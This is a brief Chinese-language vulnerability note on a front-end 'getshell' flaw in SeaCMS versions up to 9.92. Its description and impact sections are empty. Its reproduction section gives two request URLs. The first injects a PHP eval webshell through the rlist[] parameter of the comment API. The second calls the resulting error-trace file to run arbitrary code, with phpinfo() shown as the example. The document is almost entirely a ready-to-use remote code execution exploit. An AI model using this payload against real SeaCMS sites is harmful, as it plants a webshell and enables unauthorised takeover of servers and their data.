Seacms \<= 9.92 前台Getshell
============================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_]);?%3E

然后访问：

    http://0-sec.org/data/mysqli_error_trace.php?_=phpinfo()
